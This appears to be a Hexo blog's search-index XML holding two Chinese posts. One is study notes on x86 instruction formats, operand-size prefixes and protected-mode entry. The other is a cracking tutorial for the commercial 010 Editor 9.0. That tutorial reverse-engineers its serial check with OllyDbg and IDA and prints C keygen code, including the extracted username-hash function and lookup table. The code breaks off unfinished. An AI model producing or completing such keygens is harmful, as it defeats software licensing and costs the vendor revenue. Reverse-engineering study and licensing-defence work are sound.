<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>指令的格式及其操作尺寸</title>
    <url>/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/</url>
    <content><![CDATA[<h2 id="01-80286的16位保护模式"><a href="#01-80286的16位保护模式" class="headerlink" title="01. 80286的16位保护模式"></a>01. 80286的16位保护模式</h2><ol>
<li>80286的寄存器和8086有同样的寄存器</li>
</ol>
<span id="more"></span>

<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/19a8384787871958c502d877f35a4395.png" class="" title="寄存器">

<pre><code>      2. 80286的描述符有48位
     {% asset_img 89ef06a022ca9dfcc82e9db73a4dbd5a.png 80286描述符格式 %}
      	3. 80286也引入了描述符, 描述符表, 描述符高速缓存器, 段选择子的概念
          {% asset_img 50daf97b92479e82b0a8e32a76b16a03.png  %}
      	4. 80286的地址线有24位可以寻址16M空间的任意地址, 但是只有16位偏移, 所以确定了段地址后只能在1M的空间内偏移
          {% asset_img 8a96c9a8dc8774e1d9b3161716de41f8.png  %}
          {% asset_img 7cafe51b7eda396fb20e58546a24b41f.png  %}
</code></pre>
<h2 id="02-16位处理器的指令操作尺寸"><a href="#02-16位处理器的指令操作尺寸" class="headerlink" title="02. 16位处理器的指令操作尺寸"></a>02. 16位处理器的指令操作尺寸</h2><pre><code>    1.指令的操作尺寸
</code></pre>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/1bccd1d8b1b5610e78941eba1174502c.png" class="">

<pre><code>    2.  描述符高速缓存器中的基地址在实模式和保护模式下是不同的:
        **实模式**: 是将段地址左移四位得到的
        **保护模式**: 来自段描述符高速缓存器, 段描述符的内容由段选择子带入段选择器中, 从描述符表中取出对应的描述符放入段描述符高速缓存器中	
    3. 16位处理器的操作数尺寸可以是8, 16位的, 有效地址的尺寸始终是16位
</code></pre>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/d4d3c29d497abddf63260e021521a7e0.png" class="">		
<h2 id="03-32位处理器的指令操作尺寸"><a href="#03-32位处理器的指令操作尺寸" class="headerlink" title="03. 32位处理器的指令操作尺寸"></a>03. 32位处理器的指令操作尺寸</h2><ul>
<li>32位处理器的操作数尺寸可以是8, 16, 32位的, 有效地址的尺寸可以是16位或32位的</li>
</ul>
<h2 id="04-x86的指令格式ModRM和偏移量部分"><a href="#04-x86的指令格式ModRM和偏移量部分" class="headerlink" title="04. x86的指令格式ModRM和偏移量部分"></a>04. x86的指令格式ModRM和偏移量部分</h2><ul>
<li>opcode的查询方法<a href="https://www.intel.cn/content/www/cn/zh/developer/articles/technical/intel-sdm.html">手册下载地址</a></li>
</ul>
<h2 id="05-x86的指令格式-ModRM和偏移量部分"><a href="#05-x86的指令格式-ModRM和偏移量部分" class="headerlink" title="05. x86的指令格式-ModRM和偏移量部分"></a>05. x86的指令格式-ModRM和偏移量部分</h2><ul>
<li>转换汇编到数字编码<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/d762141af15edd7381c9552dfed974d8.png" class="">
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/8590328752000f9c7081b52539010081.png" class="" title="偏移/指令扩展"></li>
</ul>
<h2 id="6-x86的指令格式-SIB部分"><a href="#6-x86的指令格式-SIB部分" class="headerlink" title="6. x86的指令格式-SIB部分"></a>6. x86的指令格式-SIB部分</h2><img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/910907ba66449818ba2b68ed5c6f6e17.png" class="" title="SIB部分">
<p>SIB字段格式:</p>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/9f401588847b917a34efd2b77179a516.png" class="" title="SIB格式">
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/9d1d27fe7929e797f44ddda3482d5dcf.png" class="">

<h2 id="07-x86的指令格式-指令前缀部分"><a href="#07-x86的指令格式-指令前缀部分" class="headerlink" title="07. x86的指令格式-指令前缀部分"></a>07. x86的指令格式-指令前缀部分</h2><ul>
<li>指令前缀：段超越前缀、总线封锁前缀、数据传送指令的重复前缀、操作尺寸反转前缀、地址尺寸反转前缀等等。指令最多有4个前缀。<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/97cd999ec795a80629068bd3b2800cbf.png" class="">
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/8bba030575474d4db587df5c6466c781.png" class=""> </li>
<li>课后练习:<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/db3b39993bc34078e3043c90f7741bac.png" class=""></li>
</ul>
<h2 id="08-处理器的默认操作尺寸和相关指令前缀"><a href="#08-处理器的默认操作尺寸和相关指令前缀" class="headerlink" title="08. 处理器的默认操作尺寸和相关指令前缀"></a>08. 处理器的默认操作尺寸和相关指令前缀</h2><ul>
<li>处理器默认操作尺寸, 可以添加前缀66(数据), 67(地址)来反转操作尺寸(16or32)</li>
<li>上节课后练习答案:<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/3a2b90f96475ef1d040464aaca04e702.png" class="">
之前讲过的操作尺寸：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/b169c1846704eda0f389d538be7a6591.png" class="">
16位、32位操作尺寸：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/d379ff3ee0e2c162f46dc1d835e00d3b.png" class="">
默认操作尺寸：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/7d78596ddce36251b1e265008a4df9e2.png" class="">
所以上节习题中：<ol>
<li>默认操作尺寸是16位时: <img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/a77e8777d90139fd84264432680e7e3d.png" class=""></li>
<li>默认操作尺寸是32位时:<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/6ad1a89e5472a6f8693004e3df9525e7.png" class=""></li>
</ol>
</li>
<li>前缀<mark>66</mark>用来反转<mark>操作数</mark>的尺寸</li>
<li>前缀<mark>67</mark>用来反转<mark>有效地址</mark>的尺寸</li>
</ul>
<h2 id="09-用伪指令bits生成16位和32位模块"><a href="#09-用伪指令bits生成16位和32位模块" class="headerlink" title="09. 用伪指令bits生成16位和32位模块"></a>09. 用伪指令bits生成16位和32位模块</h2><ul>
<li>相同机器指令对应不同汇编指令：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/efd4e008221e2fc9f311bf7a6f33149a.png" class=""></li>
<li>相同机汇编指令对应不同机器指令：<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/4227a74b5c2cdb89081d296ebaadf03d.png" class=""></li>
</ul>
<pre><code>    bits 16		;也可写为[bits 16],若为第一条[bits 16]指令也可省略；
                ;因为默认使用[bits 16]编译程序
    mov ax, [bx+si]
    
    bits 32		;也可写为[bits 32]
    mov ax, [bx+si]
</code></pre>
<h2 id="10、描述符和段描述符高速缓存器的D位"><a href="#10、描述符和段描述符高速缓存器的D位" class="headerlink" title="10、描述符和段描述符高速缓存器的D位"></a>10、描述符和段描述符高速缓存器的D位</h2><pre><code>    1. 描述符的D/B位, 对于代码段来说(S=1, X=1), 此位为D, 为0表示16位操作尺寸, 为1表示32位操作尺寸.
</code></pre>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/b3f62edc204d9900604cd5e4aabff5d0.png" class="">
<p>当描述符进入高速缓存器, 会设置高速缓存器的D位处理器根据此位来设置处理器的默认操作尺寸<br>当程序加电复位时, 处理器的默认操作尺寸是16位</p>
<h2 id="11-进入保护模式并切换到32位模块使用32位默认操作尺寸"><a href="#11-进入保护模式并切换到32位模块使用32位默认操作尺寸" class="headerlink" title="11. 进入保护模式并切换到32位模块使用32位默认操作尺寸"></a>11. 进入保护模式并切换到32位模块使用32位默认操作尺寸</h2><pre><code>    ;创建#1描述符，保护模式下的代码段描述符
    mov dword [bx+0x08],0x7c0001ff     
    mov dword [bx+0x0c],0x00409800   
</code></pre>
 <img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/88bce34fe7bfe150134969f455a68fb3.png" class="" title="代码段描述符">

<ul>
<li>段基地址: 0x00007C00</li>
<li>段界限: 0x0001FF</li>
<li>G位: 为0表示段界限的粒度是byte, 段的大小为: <strong>0x1FF + 1 = 0X2000 = 512字节</strong></li>
<li>S位: <strong>为1</strong>表明是代码段</li>
<li>X位: <strong>为1</strong>表明可执行</li>
<li>P位: <strong>为1</strong>表示段是存在的</li>
<li>D/B位: <strong>为1</strong>表明是<strong>32位</strong>的默认操作尺寸<br>直接绝对原转移指令: 在保护模式和实模式下的区别</li>
</ul>
<pre><code>    ;以下进入保护模式
    jmp 0000000000010_0_00B:flush
    bits 32
    
flush:
    mov cx,00000000000_10_000B		;加载数据段选择子(0x10)
    mov ds,cx
    
    ;以下在屏幕上显示"Protect mode OK." 
    mov byte [0x00],'P'  
    mov byte [0x02],'r'
    mov byte [0x04],'o'
</code></pre>
<p>此时是在保护模式下, 默认操作尺寸是16位还未切换成32位。<br>通过描述符索引取出索引号为<mark>2</mark>的描述符存入高速缓存器中再用里面的基地址+偏移来算出要跳转的线性地址,<mark>线性地址 = 基地址(0x7c00) + 段内偏移量(flush)</mark></p>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/0d0c703da20381bef429ffdec85f20bf.png" class="">
<p>执行这条jmp之后CS段选择器被修改, CS的描述符高速缓存器内容也被新的描述符刷新<br>因为在进入<mark>jmp</mark>指令之前很多指令已经进入了流水线按16位的默认操作尺寸进行译码的. 所以在使用bits 32改变了默认操作尺寸之后, 那些指令是错误的. 但是<mark>jmp</mark>指令执行之后会清空流水线, 再按32位默认尺寸重新填充流水线译码.<br>在执行<mark>jmpf</mark>之前, 可以看到这些指令对于写显存字符来说明显是不正确的</p>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/3b6e51376fb51008fe04fb093af0f3d2.png" class="" title="16位默认操作尺寸">
<p>在执行<mark>jmpf</mark>指令之后, 可以看到当前处理器的默认操作尺寸是32位</p>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/62661cc280440dc4416627cd1013ec76.png" class="" title="转成二进制可以看出D=1">
<p>此时再查看后面的指令流水线的译码就可以看到跟我们的汇编代码是一样的了</p>
<img src="/2022/12/11/23-%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%85%B6%E6%93%8D%E4%BD%9C%E5%B0%BA%E5%AF%B8/690658f54576778d323cec9d45467004.png" class="" title="32位默认操作尺寸">
<p>从此可以看出处理器的当前默认操作尺寸确实会影响指令的译码和执行. </p>
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>X86寄存器指令格式</tag>
        <tag>X86描述符</tag>
      </tags>
  </entry>
  <entry>
    <title>010EDIT破解&amp;注册机</title>
    <url>/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/</url>
    <content><![CDATA[<p>010edit是一款非常好用的二进制文本编辑器，但是这款软件不是免费的，so让我们来分析一下它的算法，写一下注册机。</p>
<span id="more"></span>

<h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p>win7 32虚拟机，OD，IDA</p>
<h3 id="分析目标"><a href="#分析目标" class="headerlink" title="分析目标"></a>分析目标</h3><ol>
<li>编写注册机</li>
<li>去除网络验证</li>
</ol>
<h3 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h3><h4 id="0x00-今天我们分析的是9-0版本"><a href="#0x00-今天我们分析的是9-0版本" class="headerlink" title="0x00 今天我们分析的是9.0版本"></a>0x00 今天我们分析的是9.0版本</h4><img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551343193(1).jpg" class="" title="img">

<h4 id="0x01-开始分析，我们点击register按钮，弹出来窗口让我们输入用户名-amp-密码"><a href="#0x01-开始分析，我们点击register按钮，弹出来窗口让我们输入用户名-amp-密码" class="headerlink" title="0x01 开始分析，我们点击register按钮，弹出来窗口让我们输入用户名&amp;密码"></a>0x01 开始分析，我们点击register按钮，弹出来窗口让我们输入用户名&amp;密码</h4><img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549007784(1).jpg" class="" title="img">

<p>随便先输入了一组用户名和密码，弹出了提示窗口，接下来我们用OD打开010来查找这个字符串</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549009303(1).jpg" class="" title="img">

<p>双击找到字符串的位置，往上分析看是从什么地方跳过来的，通过下断点尝试我们找到了这个它做验证的位置</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549010306(1).jpg" class="" title="img">

<h4 id="0x02-接下来我们对关键算法函数进行详细分析"><a href="#0x02-接下来我们对关键算法函数进行详细分析" class="headerlink" title="0x02 接下来我们对关键算法函数进行详细分析"></a>0x02 接下来我们对关键算法函数进行详细分析</h4><img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549011565(1).jpg" class="" title="img">

<p>在这里我们发现指令对我们输入的密码进行了一系列的操作验证</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549012535(1).jpg" class="" title="img">

<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549266039(1).jpg" class="" title="img">

<p>我们需要把对密码的验证操作逐条分析出来，便于写注册机时使用</p>
<p>通过对这一块的分析，我们得到了密码的验证规则，接下来我们写代码尝试验证看我们分析的是否正确</p>
<pre><code>#include "stdafx.h"
#include &lt;Windows.h&gt;
#include&lt;time.h&gt;

int main()
{
 srand(time(NULL));

 byte k[10] = { 0X11,0X22,0X33,0X9C,0X55,0X66,0X77,0X88,0X99,0X00 };

 while (true)
 {
  byte K0 = rand() % 0xff;
  byte K6 = rand() % 0xff;

  byte al = ((K0 ^ K6) ^ 0x18 + 0x3d) ^ 0xa7;

  if (al &gt; 0)
  {
   k[0] = K0;
   k[6] = K6;
   break;
  }
 }

 while (true)
 {
  byte K1 = rand() % 0xff;
  byte K7 = rand() % 0xff;
  byte K2 = rand() % 0xff;
  byte K5 = rand() % 0xff;

  DWORD ESI = (0x100 * (K1 ^ K7 &amp; 0xff) + K2^K5 &amp; 0xff) &amp; 0xffff;
  DWORD EAX = (((ESI ^ 0x7892) + 0x4d30) ^ 0x3421) &amp; 0xffff;

  if (EAX % 0xb == 0 &amp;&amp; EAX / 0xb &lt;= 0x3e8)
  {
   k[1] = K1;
   k[7] = K7;
   k[2] = K2;
   k[5] = K5;
   break;
  }
 }
 printf("%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X", k[0], k[1], k[2], k[3], k[4], k[5], k[6], k[7], k[8], k[9]);

 getchar();

    return 0;
}
</code></pre>
<p>这样我们打开vs执行上面的代码可以得到符合密码验证规则的一个秘钥</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549612731(1).jpg" class="" title="img">

<p>但是这样输进去之后，我们依旧是不能成功的，like this</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1549613332(1).jpg" class="" title="img">

<p>因为这只是第一轮对密码的单独验证，在它后面还有第二轮验证，在第二轮验证中会把用户名也放进来和密码形成一个对应关系，符合了这两次的验证，我们的密码验证才算是通过。</p>
<h4 id="0x03-接下来我们开始分析第二轮的验证"><a href="#0x03-接下来我们开始分析第二轮的验证" class="headerlink" title="0x03. 接下来我们开始分析第二轮的验证"></a>0x03. 接下来我们开始分析第二轮的验证</h4><p>继续单步F8往下跟，不远处会有一个跳转，跳转之后开始了第二轮的验证</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551265907.jpg" class="" title="img">

<p>在分析第二轮验证的时候我们要重点分析，用户名和密码之间的对应关系，来编写后面的代码</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551266349(1).jpg" class="" title="img">
<p>a. 通过对上面这块代码的分析我们知道了，用户名是和K[4] ~ K[7]有一定的对应关系的</p>
<h4 id="0x04-现在我们梳理一下我们已有的信息"><a href="#0x04-现在我们梳理一下我们已有的信息" class="headerlink" title="0x04 现在我们梳理一下我们已有的信息"></a>0x04 现在我们梳理一下我们已有的信息</h4><p>a. 如果K[3] = 9C的话, 密码只需要8个字节就可以了.<br>b. 我们通过上面的代码已经知道了, K[0] ~ K[7]怎么样才可以通过第一轮的验证.</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551268502(1).jpg" class="" title="img">
<p>c. 通过分析我们得知K[4] = sub_1062f86返回值的最后一个字节, K[5] = 倒数第二个字节, K[6], K[7]以此类推.<br>d. 然后我们发现通过上面的对应关系我们只要求出来了用户名的值, 就已经得到了K[4] ~ K[7]的值.<br>e. 然后我们需要思考, 怎么才能得到程序中传入用户名求出的值.</p>
<h4 id="0x05-let’s-do-it"><a href="#0x05-let’s-do-it" class="headerlink" title="0x05 let’s do it"></a>0x05 let’s do it</h4><p> 从OD里面找到sub_1062f86按F7进去&gt;ctrl + x复制地址&gt;在IDA里面G搜索这个地址(如果有重定位的话记得去掉重定位: edit&gt;segments&gt;rebase program )</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551282055.jpg" class="" title="img">

<p>按F5把汇编转换成C代码&gt;会看到里面用到了一个数组&gt;将这个数组以字节的方式拷贝出来</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551282512(1).jpg" class="" title="img">

<p>将数组以字节的形式拷贝出来(因为OD没装数据转换插件所以用的x32拷贝)</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551340686(1).jpg" class="" title="img">

<p>然后看一下参数是否需要修改(这里面需要修改最后一个参数的类型改为DWORD)(是否需要修改可以看OD里面的参数类型)</p>
<img src="/2021/09/08/010EDIT%E7%A0%B4%E8%A7%A3-%E6%B3%A8%E5%86%8C%E6%9C%BA/1551338641(1).jpg" class="" title="img">

<p>然后Ctrl+A全选&gt;复制,将之作为一个函数粘贴到我们之前的代码里面</p>
<p>这样我们就完成了, 我们注册机代码的编写</p>
<pre><code>// decode010.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include &lt;windows.h&gt;
#include &lt;time.h&gt;

DWORD g_EcodeArray[] =
{ 0x39CB44B8, 0x23754F67, 0x5F017211, 0x3EBB24DA, 0x351707C6, 0x63F9774B, 0x17827288, 0x0FE74821, 0x5B5F670F, 0x48315AE8, 0x785B7769, 0x2B7A1547,
0x38D11292, 0x42A11B32, 0x35332244, 0x77437B60, 0x1EAB3B10, 0x53810000, 0x1D0212AE, 0x6F0377A8, 0x43C03092, 0x2D3C0A8E, 0x62950CBF, 0x30F06FFA,
0x34F710E0, 0x28F417FB, 0x350D2F95, 0x5A361D5A, 0x15CC060B, 0x0AFD13CC, 0x28603BCF, 0x3371066B, 0x30CD14E4, 0x175D3A67, 0x6DD66A13, 0x2D3409F9,
0x581E7B82, 0x76526B99, 0x5C8D5188, 0x2C857971, 0x15F51FC0, 0x68CC0D11, 0x49F55E5C, 0x275E4364, 0x2D1E0DBC, 0x4CEE7CE3, 0x32555840, 0x112E2E08,
0x6978065A, 0x72921406, 0x314578E7, 0x175621B7, 0x40771DBF, 0x3FC238D6, 0x4A31128A, 0x2DAD036E, 0x41A069D6, 0x25400192, 0x00DD4667, 0x6AFC1F4F,
0x571040CE, 0x62FE66DF, 0x41DB4B3E, 0x3582231F, 0x55F6079A, 0x1CA70644, 0x1B1643D2, 0x3F7228C9, 0x5F141070, 0x3E1474AB, 0x444B256E, 0x537050D9,
0x0F42094B, 0x2FD820E6, 0x778B2E5E, 0x71176D02, 0x7FEA7A69, 0x5BB54628, 0x19BA6C71, 0x39763A99, 0x178D54CD, 0x01246E88, 0x3313537E, 0x2B8E2D17,
0x2A3D10BE, 0x59D10582, 0x37A163DB, 0x30D6489A, 0x6A215C46, 0x0E1C7A76, 0x1FC760E7, 0x79B80C65, 0x27F459B4, 0x799A7326, 0x50BA1782, 0x2A116D5C,
0x63866E1B, 0x3F920E3C, 0x55023490, 0x55B56089, 0x2C391FD1, 0x2F8035C2, 0x64FD2B7A, 0x4CE8759A, 0x518504F0, 0x799501A8, 0x3F5B2CAD, 0x38E60160,
0x637641D8, 0x33352A42, 0x51A22C19, 0x085C5851, 0x032917AB, 0x2B770AC7, 0x30AC77B3, 0x2BEC1907, 0x035202D0, 0x0FA933D3, 0x61255DF3, 0x22AD06BF,
0x58B86971, 0x5FCA0DE5, 0x700D6456, 0x56A973DB, 0x5AB759FD, 0x330E0BE2, 0x5B3C0DDD, 0x495D3C60, 0x53BD59A6, 0x4C5E6D91, 0x49D9318D, 0x103D5079,
0x61CE42E3, 0x7ED5121D, 0x14E160ED, 0x212D4EF2, 0x270133F0, 0x62435A96, 0x1FA75E8B, 0x6F092FBE, 0x4A000D49, 0x57AE1C70, 0x004E2477, 0x561E7E72,
0x468C0033, 0x5DCC2402, 0x78507AC6, 0x58AF24C7, 0x0DF62D34, 0x358A4708, 0x3CFB1E11, 0x2B71451C, 0x77A75295, 0x56890721, 0x0FEF75F3, 0x120F24F1,
0x01990AE7, 0x339C4452, 0x27A15B8E, 0x0BA7276D, 0x60DC1B7B, 0x4F4B7F82, 0x67DB7007, 0x4F4A57D9, 0x621252E8, 0x20532CFC, 0x6A390306, 0x18800423,
0x19F3778A, 0x462316F0, 0x56AE0937, 0x43C2675C, 0x65CA45FD, 0x0D604FF2, 0x0BFD22CB, 0x3AFE643B, 0x3BF67FA6, 0x44623579, 0x184031F8, 0x32174F97,
0x4C6A092A, 0x5FB50261, 0x01650174, 0x33634AF1, 0x712D18F4, 0x6E997169, 0x5DAB7AFE, 0x7C2B2EE8, 0x6EDB75B4, 0x5F836FB6, 0x3C2A6DD6, 0x292D05C2,
0x052244DB, 0x149A5F4F, 0x5D486540, 0x331D15EA, 0x4F456920, 0x483A699F, 0x3B450F05, 0x3B207C6C, 0x749D70FE, 0x417461F6, 0x62B031F1, 0x2750577B,
0x29131533, 0x588C3808, 0x1AEF3456, 0x0F3C00EC, 0x7DA74742, 0x4B797A6C, 0x5EBB3287, 0x786558B8, 0x00ED4FF2, 0x6269691E, 0x24A2255F, 0x62C11F7E,
0x2F8A7DCD, 0x643B17FE, 0x778318B8, 0x253B60FE, 0x34BB63A3, 0x5B03214F, 0x5F1571F4, 0x1A316E9F, 0x7ACF2704, 0x28896838, 0x18614677, 0x1BF569EB,
0x0BA85EC9, 0x6ACA6B46, 0x1E43422A, 0x514D5F0E, 0x413E018C, 0x307626E9, 0x01ED1DFA, 0x49F46F5A, 0x461B642B, 0x7D7007F2, 0x13652657, 0x6B160BC5,
0x65E04849, 0x1F526E1C, 0x5A0251B6, 0x2BD73F69, 0x2DBF7ACD, 0x51E63E80, 0x5CF2670F, 0x21CD0A03, 0x5CFF0261, 0x33AE061E, 0x3BB6345F, 0x5D814A75,
0x257B5DF4, 0x0A5C2C5B, 0x16A45527, 0x16F23945 };

int __cdecl EnCodeUsername(const char *userName, int a2, char a3, unsigned __int16 a4)    // 计算用户名字符串的值
{
 const char *v4; // edx@1
 signed int v5; // esi@1
 signed int v6; // edi@1
 unsigned __int8 v7; // bl@2
 int v8; // eax@3
 int v9; // ecx@3
 int v10; // ecx@4
 int result; // eax@4
 int v12; // ecx@5
 unsigned __int8 v13; // [sp+8h] [bp-10h]@2
 unsigned __int8 v14; // [sp+Ch] [bp-Ch]@2
 unsigned __int8 v15; // [sp+10h] [bp-8h]@2
 int v16; // [sp+14h] [bp-4h]@1

 v4 = userName;
 v16 = 0;
 v5 = strlen(userName);
 v6 = 0;
 if (v5 &lt;= 0)
 {
  result = 0;
 }
 else
 {
  v13 = 0;
  v14 = 0;
  v7 = 15 * a4;
  v15 = 17 * a3;
  do
  {
   v8 = toupper(v4[v6]);
   v9 = v16 + g_EcodeArray[v8];
   if (a2)
   {
    v10 = g_EcodeArray[v7]
     + g_EcodeArray[v15]
     + g_EcodeArray[(unsigned __int8)(v8 + 47)] * (g_EcodeArray[(unsigned __int8)(v8 + 13)] ^ v9);
    result = g_EcodeArray[v14] + v10;
    v16 = g_EcodeArray[v14] + v10;
   }
   else
   {
    v12 = g_EcodeArray[v7]
     + g_EcodeArray[v15]
     + g_EcodeArray[(unsigned __int8)(v8 + 23)] * (g_EcodeArray[(unsigned __int8)(v8 + 63)] ^ v9);
    result = g_EcodeArray[v13] + v12;
    v16 = g_EcodeArray[v13] + v12;
   }
   v14 += 19;
   ++v6;
   v15 += 9;
   v7 += 13;
   v13 += 7;
   v4 = userName;
  } while (v6 &lt; v5);
 }
 return result;
}

int main()
{
 srand(time(NULL));

 // 0. 初始化
 int dwRet = rand() % 0x3E8;
 byte k[10] = { 0x11, 0x22, 0x33, 0x9C, 0x55, 0x66, 0x77, 0x88, 0x99, 0x00 };

 // 用户名,加密求值
 char szName[50] = { 0 };
 printf("please enter user name:");
 scanf_s("%s", szName, 50);
 DWORD dwKey = EnCodeUsername(szName,1,0,dwRet);

 // 给k[4]~k[7]赋值

 // cmp K[4], retValue&amp;0xFF
 // cmp K[5], retValue&gt;&gt;8&amp;&amp;0xFF
